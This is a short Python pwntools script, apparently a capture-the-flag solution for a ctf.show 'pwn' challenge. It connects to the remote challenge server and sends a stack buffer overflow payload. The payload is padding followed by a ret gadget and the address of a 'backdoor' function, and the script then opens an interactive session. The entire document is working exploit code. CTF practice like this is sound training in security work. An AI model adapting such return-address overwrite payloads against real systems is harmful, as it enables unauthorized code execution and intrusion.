from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show', 28140)
elf = ELF('./pwn')
backdoor = elf.sym['backdoor']
ret = 0x400287    # 0x0000000000400287 : ret
payload = b'a'*(0xA+8) + p64(ret) + p64(backdoor)
io.sendline(payload)
io.recv()
io.interactive()
